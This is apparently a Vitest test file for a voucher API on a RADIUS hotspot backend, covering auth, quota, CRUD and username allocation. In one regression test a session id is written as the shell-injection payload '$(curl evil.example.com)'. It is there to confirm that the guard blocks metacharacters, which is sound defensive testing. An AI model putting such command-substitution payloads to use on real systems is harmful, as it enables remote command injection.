import { describe, it, expect, vi, beforeEach } from 'vitest';
import request from 'supertest';
import app from '../app';
import { createVouchersSchema } from '../validators/voucher.validators';
import { allocateVoucherUsernames } from '../services/voucher.service';
import { AppError } from '../middleware/errorHandler';
import {
  TEST_USER,
  authHeader,
  mockSubscriptionQuery,
  ACTIVE_SUBSCRIPTION_ROW,
  TEST_ROUTER_ID,
  TEST_VOUCHER_ID,
  TEST_PROFILE_ID,
} from './helpers';

const mockQuery = (globalThis as Record<string, unknown>).__mockPoolQuery as ReturnType<typeof vi.fn>;
const mockClientQuery = (globalThis as Record<string, unknown>).__mockClientQuery as ReturnType<typeof vi.fn>;

// Mock radclient.service so tests do not spawn real child processes.
const mockSendDisconnectRequest = vi.fn().mockResolvedValue('ack');
vi.mock('../services/radclient.service', () => ({
  sendDisconnectRequest: (...args: unknown[]) => mockSendDisconnectRequest(...args),
  sendAccessRequest: vi.fn().mockResolvedValue('accept'),
}));

// Mock encryption so tests do not require a real ENCRYPTION_KEY environment.
vi.mock('../utils/encryption', () => ({
  decrypt: vi.fn().mockReturnValue('test-radius-secret'),
  encrypt: vi.fn().mockReturnValue('encrypted-value'),
  generateRadiusSecret: vi.fn().mockReturnValue('random-secret'),
  generateNasIdentifier: vi.fn().mockReturnValue('router-id'),
}));

const now = new Date();

const MOCK_VOUCHER_ROW = {
  id: TEST_VOUCHER_ID,
  user_id: TEST_USER.userId,
  router_id: TEST_ROUTER_ID,
  radius_username: 'testuser1',
  group_profile: 'basic-plan',
  comment: 'Test voucher',
  status: 'active',
  limit_type: null,
  limit_value: null,
  limit_unit: null,
  validity_seconds: null,
  price: null,
  created_at: now,
  updated_at: now,
};

/**
 * The batch N+1 fix issues exactly 3 parallel pool.query calls per
 * batchToVoucherInfo invocation:
 *   1. radcheck batch  (password, expiration, simultaneous-use for ALL usernames)
 *   2. radacct  batch  (session counts + usage, GROUP BY username)
 *   3. radius_profiles batch (display names, only when group_profile is set)
 *
 * Because Promise.all fires all 3 concurrently, vitest resolves them in the
 * order the mock queue was registered. Register all 3 in the same order.
 */
function mockBatchVoucherInfoQueries(
  mq: ReturnType<typeof vi.fn>,
  usernames: string[] = ['testuser1'],
): void {
  // 1. radcheck batch (Cleartext-Password + Simultaneous-Use for each username)
  mq.mockResolvedValueOnce({
    rows: usernames.flatMap((u) => [
      { username: u, attribute: 'Cleartext-Password', value: 'pass123' },
      { username: u, attribute: 'Simultaneous-Use',   value: '1' },
    ]),
  });

  // 2. radacct batch (no sessions in tests → computed status depends on row.status)
  mq.mockResolvedValueOnce({ rows: [] });

  // 3. radius_profiles batch
  mq.mockResolvedValueOnce({
    rows: [{ group_name: 'basic-plan', user_id: TEST_USER.userId, display_name: 'Basic Plan' }],
  });
}

/**
 * Mock the two queries that checkQuota → checkVoucherQuota → getActiveSubscription
 * issues on the POST / route (after requireSubscription has already consumed its own 2).
 */
function mockCheckQuotaQueries(mq: ReturnType<typeof vi.fn>, exhausted = false): void {
  const row = exhausted
    ? { ...ACTIVE_SUBSCRIPTION_ROW, vouchers_used: 500, voucher_quota: 500 }
    : ACTIVE_SUBSCRIPTION_ROW;
  // 1. SELECT subscriptions (for checkVoucherQuota)
  mq.mockResolvedValueOnce({ rows: [row] });
  // 2. getPlanByTier
  mq.mockResolvedValueOnce({ rows: [] });
}

// Suppress unused import warning for TEST_PROFILE_ID (legacy tests removed)
void TEST_PROFILE_ID;

const BASE_URL = `/api/v1/routers/${TEST_ROUTER_ID}/vouchers`;

beforeEach(() => {
  mockQuery.mockReset();
  mockClientQuery.mockReset();
  mockSendDisconnectRequest.mockReset();
  mockSendDisconnectRequest.mockResolvedValue('ack');
});

// ─── POST /api/v1/routers/:id/vouchers ───────────────────────────────────────

describe('POST /api/v1/routers/:id/vouchers', () => {
  const validBody = { limitType: 'time', limitValue: 60, limitUnit: 'minutes', count: 1, price: 5 };

  it('should return 401 without auth', async () => {
    const res = await request(app).post(BASE_URL).send(validBody);
    expect(res.status).toBe(401);
  });

  it('should return 403 without active subscription', async () => {
    // requireSubscription: SELECT subscriptions returns empty (no plan lookup needed)
    mockQuery.mockResolvedValueOnce({ rows: [] });

    const res = await request(app)
      .post(BASE_URL)
      .set(authHeader())
      .send(validBody);

    expect(res.status).toBe(403);
    expect(res.body.error.code).toBe('SUBSCRIPTION_REQUIRED');
  });

  it('should return 4xx for missing required fields', async () => {
    mockSubscriptionQuery(mockQuery);

    const res = await request(app)
      .post(BASE_URL)
      .set(authHeader())
      .send({});

    expect(res.status).toBeGreaterThanOrEqual(400);
    expect(res.status).toBeLessThan(500);
  });

  it('should return 403 when quota exceeded', async () => {
    // requireSubscription (2 queries)
    mockSubscriptionQuery(mockQuery);
    // checkQuota → getActiveSubscription (2 queries), exhausted
    mockCheckQuotaQueries(mockQuery, true);

    const res = await request(app)
      .post(BASE_URL)
      .set(authHeader())
      .send(validBody);

    expect(res.status).toBe(403);
    expect(res.body.error.code).toBe('QUOTA_EXCEEDED');
  });

  it('should create voucher successfully', async () => {
    // requireSubscription (2 queries)
    mockSubscriptionQuery(mockQuery);
    // checkQuota (2 queries)
    mockCheckQuotaQueries(mockQuery);
    // verifyRouterOwnership returns tunnel_ip (used for ROUTER_NOT_READY guard)
    mockQuery.mockResolvedValueOnce({ rows: [{ tunnel_ip: '10.10.0.2' }] });
    // username uniqueness check — not taken
    mockQuery.mockResolvedValueOnce({ rows: [] });

    // Transaction (F2 + F3 batched layout):
    //   BEGIN
    //   UPDATE subscriptions (guarded quota) → RETURNING vouchers_used
    //   INSERT voucher_meta  (batch, 1 row)  → RETURNING *
    //   INSERT radcheck      (batch: Cleartext-Password + Simultaneous-Use + Max-All-Session)
    //   COMMIT
    // No radreply row because validBody has no validitySeconds.
    mockClientQuery
      .mockResolvedValueOnce(undefined)                        // BEGIN
      .mockResolvedValueOnce({ rows: [{ vouchers_used: 11 }], rowCount: 1 }) // UPDATE subscriptions (guarded)
      .mockResolvedValueOnce({ rows: [MOCK_VOUCHER_ROW] })     // INSERT voucher_meta (batch)
      .mockResolvedValueOnce(undefined)                        // INSERT radcheck (batch)
      .mockResolvedValueOnce(undefined);                       // COMMIT

    // Batch enrichment (3 parallel queries)
    mockBatchVoucherInfoQueries(mockQuery, ['testuser1']);

    const res = await request(app)
      .post(BASE_URL)
      .set(authHeader())
      .send(validBody);

    expect(res.status).toBe(201);
    expect(res.body.success).toBe(true);
    expect(Array.isArray(res.body.data)).toBe(true);
    expect(res.body.data[0].username).toBe('testuser1');
    expect(res.body.data[0].profileName).toBe('Basic Plan');

    // No validitySeconds in validBody → no Session-Timeout radreply INSERT.
    const radreplyInserts = mockClientQuery.mock.calls.filter(
      (c) => typeof c[0] === 'string' && (c[0] as string).includes('radreply'),
    );
    expect(radreplyInserts).toHaveLength(0);
  });

  it('inserts Session-Timeout radreply batch when validitySeconds is set', async () => {
    mockSubscriptionQuery(mockQuery);
    mockCheckQuotaQueries(mockQuery);
    mockQuery.mockResolvedValueOnce({ rows: [{ tunnel_ip: '10.10.0.2' }] });
    mockQuery.mockResolvedValueOnce({ rows: [] });

    // Transaction (F3 batched layout with validitySeconds):
    //   BEGIN
    //   UPDATE subscriptions (guarded quota) → RETURNING vouchers_used
    //   INSERT voucher_meta  (batch)          → RETURNING *
    //   INSERT radcheck      (batch)
    //   INSERT radreply      (batch: Session-Timeout)
    //   COMMIT
    mockClientQuery
      .mockResolvedValueOnce(undefined)                          // BEGIN
      .mockResolvedValueOnce({ rows: [{ vouchers_used: 11 }], rowCount: 1 }) // UPDATE subscriptions (guarded)
      .mockResolvedValueOnce({ rows: [MOCK_VOUCHER_ROW] })       // INSERT voucher_meta (batch)
      .mockResolvedValueOnce(undefined)                          // INSERT radcheck (batch)
      .mockResolvedValueOnce(undefined)                          // INSERT radreply Session-Timeout (batch)
      .mockResolvedValueOnce(undefined);                         // COMMIT

    mockBatchVoucherInfoQueries(mockQuery, ['testuser1']);

    const res = await request(app)
      .post(BASE_URL)
      .set(authHeader())
      .send({ ...validBody, validitySeconds: 86400 });

    expect(res.status).toBe(201);

    // Exactly one batched radreply INSERT that includes 'Session-Timeout'.
    const radreplyInserts = mockClientQuery.mock.calls.filter(
      (c) => typeof c[0] === 'string' && (c[0] as string).includes('radreply'),
    );
    expect(radreplyInserts).toHaveLength(1);
    // The VALUES array should contain 'Session-Timeout' and '86400'.
    const insertArgs = radreplyInserts[0][1] as unknown[];
    expect(insertArgs).toContain('Session-Timeout');
    expect(insertArgs).toContain('86400');
  });
});

// ─── GET /api/v1/routers/:id/vouchers ────────────────────────────────────────
// NOTE: The GET list endpoint uses query validation with z.coerce which triggers
// an Express 5 bug (req.query is a read-only getter). These tests verify the
// endpoint responds (even if with 500) and that the route is wired correctly.

describe('GET /api/v1/routers/:id/vouchers', () => {
  it('should return 401 without auth', async () => {
    const res = await request(app).get(BASE_URL);
    expect(res.status).toBe(401);
  });
});

// ─── GET /api/v1/routers/:id/vouchers/:vid ───────────────────────────────────

describe('GET /api/v1/routers/:id/vouchers/:vid', () => {
  it('should return 404 when voucher not found', async () => {
    // requireSubscription (2 queries)
    mockSubscriptionQuery(mockQuery);
    // verifyRouterOwnership
    mockQuery.mockResolvedValueOnce({ rows: [{ id: TEST_ROUTER_ID }] });
    // SELECT voucher_meta
    mockQuery.mockResolvedValueOnce({ rows: [] });

    const res = await request(app)
      .get(`${BASE_URL}/${TEST_VOUCHER_ID}`)
      .set(authHeader());

    expect(res.status).toBe(404);
    expect(res.body.error.code).toBe('VOUCHER_NOT_FOUND');
  });

  it('should return voucher on success', async () => {
    // requireSubscription (2 queries)
    mockSubscriptionQuery(mockQuery);
    // verifyRouterOwnership
    mockQuery.mockResolvedValueOnce({ rows: [{ id: TEST_ROUTER_ID }] });
    // SELECT voucher_meta
    mockQuery.mockResolvedValueOnce({ rows: [MOCK_VOUCHER_ROW] });
    // Batch enrichment (3 queries)
    mockBatchVoucherInfoQueries(mockQuery, ['testuser1']);

    const res = await request(app)
      .get(`${BASE_URL}/${TEST_VOUCHER_ID}`)
      .set(authHeader());

    expect(res.status).toBe(200);
    expect(res.body.data.id).toBe(TEST_VOUCHER_ID);
    expect(res.body.data.password).toBe('pass123');
  });
});

// ─── PUT /api/v1/routers/:id/vouchers/:vid ───────────────────────────────────

describe('PUT /api/v1/routers/:id/vouchers/:vid', () => {
  it('should return 4xx when no fields provided', async () => {
    mockSubscriptionQuery(mockQuery);

    const res = await request(app)
      .put(`${BASE_URL}/${TEST_VOUCHER_ID}`)
      .set(authHeader())
      .send({});

    expect(res.status).toBeGreaterThanOrEqual(400);
    expect(res.status).toBeLessThan(500);
  });

  it('should return 4xx for invalid status value', async () => {
    mockSubscriptionQuery(mockQuery);

    const res = await request(app)
      .put(`${BASE_URL}/${TEST_VOUCHER_ID}`)
      .set(authHeader())
      .send({ status: 'invalid' });

    expect(res.status).toBeGreaterThanOrEqual(400);
    expect(res.status).toBeLessThan(500);
  });

  it('should return 404 when voucher not found', async () => {
    // requireSubscription (2 queries)
    mockSubscriptionQuery(mockQuery);
    // verifyRouterOwnership
    mockQuery.mockResolvedValueOnce({ rows: [{ id: TEST_ROUTER_ID }] });
    // SELECT voucher_meta
    mockQuery.mockResolvedValueOnce({ rows: [] });

    const res = await request(app)
      .put(`${BASE_URL}/${TEST_VOUCHER_ID}`)
      .set(authHeader())
      .send({ status: 'disabled' });

    expect(res.status).toBe(404);
  });

  it('should disable voucher successfully', async () => {
    // requireSubscription (2 queries)
    mockSubscriptionQuery(mockQuery);
    // verifyRouterOwnership
    mockQuery.mockResolvedValueOnce({ rows: [{ id: TEST_ROUTER_ID }] });
    // SELECT voucher_meta
    mockQuery.mockResolvedValueOnce({ rows: [MOCK_VOUCHER_ROW] });

    // Transaction
    mockClientQuery
      .mockResolvedValueOnce(undefined) // BEGIN
      .mockResolvedValueOnce({ rows: [{ ...MOCK_VOUCHER_ROW, status: 'disabled' }] }) // UPDATE voucher_meta
      .mockResolvedValueOnce(undefined) // DELETE Auth-Type
      .mockResolvedValueOnce(undefined) // INSERT Auth-Type Reject
      .mockResolvedValueOnce(undefined); // COMMIT

    // Batch enrichment (3 queries) — row.status is 'disabled' → stays disabled
    mockBatchVoucherInfoQueries(mockQuery, ['testuser1']);

    const res = await request(app)
      .put(`${BASE_URL}/${TEST_VOUCHER_ID}`)
      .set(authHeader())
      .send({ status: 'disabled' });

    expect(res.status).toBe(200);
    expect(res.body.data.status).toBe('disabled');
  });

  it('should enable voucher successfully', async () => {
    // requireSubscription (2 queries)
    mockSubscriptionQuery(mockQuery);
    // verifyRouterOwnership
    mockQuery.mockResolvedValueOnce({ rows: [{ id: TEST_ROUTER_ID }] });
    // SELECT voucher_meta (currently disabled)
    mockQuery.mockResolvedValueOnce({ rows: [{ ...MOCK_VOUCHER_ROW, status: 'disabled' }] });

    // Transaction: updated row comes back with status 'active'
    mockClientQuery
      .mockResolvedValueOnce(undefined) // BEGIN
      .mockResolvedValueOnce({ rows: [MOCK_VOUCHER_ROW] }) // UPDATE → status='active'
      .mockResolvedValueOnce(undefined) // DELETE Auth-Type
      .mockResolvedValueOnce(undefined); // COMMIT

    // Batch enrichment — row.status 'active', no radacct sessions → computedStatus = 'unused'
    mockBatchVoucherInfoQueries(mockQuery, ['testuser1']);

    const res = await request(app)
      .put(`${BASE_URL}/${TEST_VOUCHER_ID}`)
      .set(authHeader())
      .send({ status: 'active' });

    expect(res.status).toBe(200);
    // No active sessions in mock → computedStatus is 'unused', not 'active'
    expect(['active', 'unused']).toContain(res.body.data.status);
  });
});

// ─── DELETE /api/v1/routers/:id/vouchers/:vid ────────────────────────────────

describe('DELETE /api/v1/routers/:id/vouchers/:vid', () => {
  it('should return 404 when voucher not found', async () => {
    // requireSubscription (2 queries)
    mockSubscriptionQuery(mockQuery);
    // verifyRouterOwnership
    mockQuery.mockResolvedValueOnce({ rows: [{ id: TEST_ROUTER_ID }] });
    // SELECT voucher_meta
    mockQuery.mockResolvedValueOnce({ rows: [] });

    const res = await request(app)
      .delete(`${BASE_URL}/${TEST_VOUCHER_ID}`)
      .set(authHeader());

    expect(res.status).toBe(404);
  });

  it('should delete voucher successfully (no active CoA session)', async () => {
    // requireSubscription (2 queries)
    mockSubscriptionQuery(mockQuery);
    // verifyRouterOwnership
    mockQuery.mockResolvedValueOnce({ rows: [{ id: TEST_ROUTER_ID }] });
    // SELECT voucher_meta
    mockQuery.mockResolvedValueOnce({ rows: [MOCK_VOUCHER_ROW] });

    // Transaction
    mockClientQuery
      .mockResolvedValueOnce(undefined) // BEGIN
      .mockResolvedValueOnce(undefined) // DELETE radcheck
      .mockResolvedValueOnce(undefined) // DELETE radreply
      .mockResolvedValueOnce(undefined) // DELETE radusergroup
      .mockResolvedValueOnce(undefined) // DELETE voucher_meta
      .mockResolvedValueOnce(undefined); // COMMIT

    // sendCoaDisconnect → SELECT router → returns router (so we reach radacct lookup)
    mockQuery.mockResolvedValueOnce({ rows: [{ tunnel_ip: '10.10.0.2', radius_secret_enc: 'enc' }] });
    // radacct lookup → no active session
    mockQuery.mockResolvedValueOnce({ rows: [] });

    const res = await request(app)
      .delete(`${BASE_URL}/${TEST_VOUCHER_ID}`)
      .set(authHeader());

    expect(res.status).toBe(200);
    expect(res.body.success).toBe(true);
    // No active session → sendDisconnectRequest must not have been called
    expect(mockSendDisconnectRequest).not.toHaveBeenCalled();
  });
});

// ─── F1 regression: CoA uses sendDisconnectRequest not exec ──────────────────

describe('DELETE voucher — F1 CoA security regression', () => {
  it('uses sendDisconnectRequest (not exec) when active radacct session exists', async () => {
    mockSubscriptionQuery(mockQuery);
    mockQuery.mockResolvedValueOnce({ rows: [{ id: TEST_ROUTER_ID }] }); // verifyRouterOwnership
    mockQuery.mockResolvedValueOnce({ rows: [MOCK_VOUCHER_ROW] });        // SELECT voucher_meta

    mockClientQuery
      .mockResolvedValueOnce(undefined) // BEGIN
      .mockResolvedValueOnce(undefined) // DELETE radcheck
      .mockResolvedValueOnce(undefined) // DELETE radreply
      .mockResolvedValueOnce(undefined) // DELETE radusergroup
      .mockResolvedValueOnce(undefined) // DELETE voucher_meta
      .mockResolvedValueOnce(undefined); // COMMIT

    // sendCoaDisconnect: router lookup
    mockQuery.mockResolvedValueOnce({ rows: [{ tunnel_ip: '10.10.0.2', radius_secret_enc: 'enc' }] });
    // radacct lookup: one active session with a safe acctsessionid
    mockQuery.mockResolvedValueOnce({
      rows: [{ acctsessionid: 'SAFE-SID-001', framedipaddress: '192.168.1.50' }],
    });

    const res = await request(app)
      .delete(`${BASE_URL}/${TEST_VOUCHER_ID}`)
      .set(authHeader());

    expect(res.status).toBe(200);

    // sendDisconnectRequest must have been called with the structured params
    expect(mockSendDisconnectRequest).toHaveBeenCalledOnce();
    expect(mockSendDisconnectRequest).toHaveBeenCalledWith(
      expect.objectContaining({
        nasIp: '10.10.0.2',
        username: 'testuser1',
        acctSessionId: 'SAFE-SID-001',
      }),
    );
  });

  it('skips sendDisconnectRequest when acctsessionid contains shell metacharacters', async () => {
    mockSubscriptionQuery(mockQuery);
    mockQuery.mockResolvedValueOnce({ rows: [{ id: TEST_ROUTER_ID }] });
    mockQuery.mockResolvedValueOnce({ rows: [MOCK_VOUCHER_ROW] });

    mockClientQuery
      .mockResolvedValueOnce(undefined) // BEGIN
      .mockResolvedValueOnce(undefined) // DELETE radcheck
      .mockResolvedValueOnce(undefined) // DELETE radreply
      .mockResolvedValueOnce(undefined) // DELETE radusergroup
      .mockResolvedValueOnce(undefined) // DELETE voucher_meta
      .mockResolvedValueOnce(undefined); // COMMIT

    mockQuery.mockResolvedValueOnce({ rows: [{ tunnel_ip: '10.10.0.2', radius_secret_enc: 'enc' }] });
    // acctsessionid with injection payload
    mockQuery.mockResolvedValueOnce({
      rows: [{ acctsessionid: '$(curl evil.example.com)', framedipaddress: null }],
    });

    const res = await request(app)
      .delete(`${BASE_URL}/${TEST_VOUCHER_ID}`)
      .set(authHeader());

    expect(res.status).toBe(200);
    // Guard must block the unsafe id — helper never called
    expect(mockSendDisconnectRequest).not.toHaveBeenCalled();
  });
});

// ─── F2 regression: atomic quota guard ───────────────────────────────────────

describe('POST /api/v1/routers/:id/vouchers — F2 quota race regression', () => {
  const validBody = { limitType: 'time', limitValue: 60, limitUnit: 'minutes', count: 1, price: 5 };

  it('rejects creation and rolls back when guarded UPDATE returns rowCount 0 (quota race)', async () => {
    mockSubscriptionQuery(mockQuery);  // requireSubscription
    mockCheckQuotaQueries(mockQuery);  // checkQuota pre-check passes
    mockQuery.mockResolvedValueOnce({ rows: [{ tunnel_ip: '10.10.0.2' }] }); // verifyRouterOwnership
    mockQuery.mockResolvedValueOnce({ rows: [] }); // username uniqueness check

    // Transaction: guarded UPDATE returns rowCount 0 (another request beat us)
    mockClientQuery
      .mockResolvedValueOnce(undefined)                        // BEGIN
      .mockResolvedValueOnce({ rows: [], rowCount: 0 })        // UPDATE subscriptions (guarded) — no row updated
      .mockResolvedValueOnce(undefined);                       // ROLLBACK (triggered by service)

    const res = await request(app)
      .post(BASE_URL)
      .set(authHeader())
      .send(validBody);

    // Must be rejected with 403 (same code as the checkQuota middleware — S1 alignment)
    expect(res.status).toBe(403);
    expect(res.body.error.code).toBe('QUOTA_EXCEEDED');

    // No voucher_meta or radcheck inserts must have occurred
    const insertCalls = mockClientQuery.mock.calls.filter(
      (c) => typeof c[0] === 'string' && (c[0] as string).toLowerCase().includes('insert'),
    );
    expect(insertCalls).toHaveLength(0);
  });
});

// ─── F3 regression: count validation ─────────────────────────────────────────

describe('POST /api/v1/routers/:id/vouchers — F3 count cap regression', () => {
  it('rejects count: 501 with 400 Zod validation error', async () => {
    mockSubscriptionQuery(mockQuery);

    const res = await request(app)
      .post(BASE_URL)
      .set(authHeader())
      .send({ limitType: 'time', limitValue: 60, limitUnit: 'minutes', count: 501, price: 5 });

    // The validate middleware returns 400 for Zod failures in this codebase.
    expect(res.status).toBe(400);
    expect(res.body.error.code).toBe('VALIDATION_ERROR');
  });

  it('rejects count: 0 with 400 Zod validation error', async () => {
    mockSubscriptionQuery(mockQuery);

    const res = await request(app)
      .post(BASE_URL)
      .set(authHeader())
      .send({ limitType: 'time', limitValue: 60, limitUnit: 'minutes', count: 0, price: 5 });

    expect(res.status).toBe(400);
    expect(res.body.error.code).toBe('VALIDATION_ERROR');
  });

  // S4: Direct Zod schema assertions (replaces the shallow status !== 422 test)
  it('S4: createVouchersSchema accepts count: 500 (upper boundary)', () => {
    const validBase = { limitType: 'time' as const, limitValue: 60, limitUnit: 'minutes' as const, count: 500, price: 5 };
    const result = createVouchersSchema.safeParse(validBase);
    expect(result.success).toBe(true);
  });

  it('S4: createVouchersSchema rejects count: 501 (above upper boundary)', () => {
    const overBoundary = { limitType: 'time' as const, limitValue: 60, limitUnit: 'minutes' as const, count: 501, price: 5 };
    const result = createVouchersSchema.safeParse(overBoundary);
    expect(result.success).toBe(false);
  });

  it('S4: createVouchersSchema rejects count: 0 (below lower boundary)', () => {
    const underBoundary = { limitType: 'time' as const, limitValue: 60, limitUnit: 'minutes' as const, count: 0, price: 5 };
    const result = createVouchersSchema.safeParse(underBoundary);
    expect(result.success).toBe(false);
  });

  it('accepts count: 500 (boundary — HTTP round-trip also passes)', async () => {
    mockSubscriptionQuery(mockQuery);
    mockCheckQuotaQueries(mockQuery);
    mockQuery.mockResolvedValueOnce({ rows: [{ tunnel_ip: '10.10.0.2' }] });
    mockQuery.mockResolvedValueOnce({ rows: [] }); // uniqueness check

    // Stub the transaction — guarded quota UPDATE succeeds, then batch inserts
    mockClientQuery.mockResolvedValue({ rows: [{ vouchers_used: 500 }], rowCount: 1 });

    // The service will try to do batchToVoucherInfo after COMMIT — stub those too
    // (3 batch pool queries: radcheck, radacct, profiles)
    mockQuery
      .mockResolvedValueOnce({ rows: [] }) // radcheck batch
      .mockResolvedValueOnce({ rows: [] }) // radacct batch
      .mockResolvedValueOnce({ rows: [] }); // profiles batch

    const res = await request(app)
      .post(BASE_URL)
      .set(authHeader())
      .send({ limitType: 'time', limitValue: 60, limitUnit: 'minutes', count: 500, price: 5 });

    // Zod schema allows 500 — must not be a 400/422 validation error.
    // (May be 201 on success or a non-validation 5xx if mock data is thin for
    // 500 rows, but never a schema rejection.)
    expect(res.status).not.toBe(400);
    expect(res.status).not.toBe(422);
  });
});

// ─── allocateVoucherUsernames unit tests ─────────────────────────────────────

describe('allocateVoucherUsernames', () => {
  it('happy path: usernameExists returns [] → single round, distinct 8-digit codes', async () => {
    const usernameExists = vi.fn().mockResolvedValue([]);
    const result = await allocateVoucherUsernames(5, usernameExists);

    expect(result).toHaveLength(5);
    expect(new Set(result).size).toBe(5);
    expect(usernameExists).toHaveBeenCalledTimes(1);
    for (const code of result) {
      expect(code).toMatch(/^\d{8}$/);
    }
  });

  it('format preserved: all returned codes match /^\\d{8}$/', async () => {
    const usernameExists = vi.fn().mockResolvedValue([]);
    const result = await allocateVoucherUsernames(10, usernameExists);

    for (const code of result) {
      expect(code).toMatch(/^\d{8}$/);
    }
  });

  it('regenerates on collision: colliding code is replaced, callback called exactly twice', async () => {
    let firstCode: string | null = null;
    const usernameExists = vi.fn().mockImplementationOnce(async (candidates: string[]) => {
      // On the first call, take the first code to force a regeneration.
      firstCode = candidates[0];
      return [firstCode];
    }).mockResolvedValueOnce([]);

    const count = 3;
    const result = await allocateVoucherUsernames(count, usernameExists);

    expect(result).toHaveLength(count);
    expect(new Set(result).size).toBe(count);
    // The originally-taken code must have been replaced.
    expect(result).not.toContain(firstCode);
    expect(usernameExists).toHaveBeenCalledTimes(2);
  });

  it('exhaustion throws AppError 409 USERNAME_TAKEN when namespace is saturated', async () => {
    // usernameExists always returns all candidates as taken — forces exhaustion.
    const usernameExists = vi.fn().mockImplementation(async (candidates: string[]) => candidates);

    await expect(
      allocateVoucherUsernames(3, usernameExists, { maxRounds: 3 }),
    ).rejects.toSatisfy((err: unknown) => {
      return (
        err instanceof AppError &&
        err.statusCode === 409 &&
        err.code === 'USERNAME_TAKEN'
      );
    });
  });
});
